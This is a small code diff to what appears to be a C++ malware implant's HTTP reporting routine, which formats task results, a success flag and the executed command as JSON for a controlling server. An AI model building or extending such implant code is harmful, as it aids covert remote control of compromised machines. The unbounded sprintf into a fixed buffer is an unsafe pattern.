@@ -249,9 +249,10 @@ std::string HttpResponse(std::string uri, int implant_id, int task_id, std::stri
     int temp = var1 + var2 + results.length() + success.length() + command.length();
     // LENGTH NEEDS TO BE SCALED DEPENDING ON OUR RANGE FOR IMPLANT_ID
     
-    int length = 72 + temp;
+    int length = 78 + temp;
     char postdata[1000];
-    sprintf(postdata, "{\"target_implant_id\":%d , \"task_id\":%d, \"response_data\":%s , \"success\":%s, \"command\":%s}", implant_id, task_id, results, success, command);
+    sprintf(postdata, "{\"target_implant_id\":%d,\"task_id\":%d,\"response_data\":\"%s\",\"success\":\"%s\",\"command\":\"%s\"}", implant_id, task_id, results.c_str(), success.c_str(), command.c_str());
+    std::cout << postdata << std::endl;
 
     LPCWSTR additionalHeaders = L"Content-Type: application/json\r\n";
 
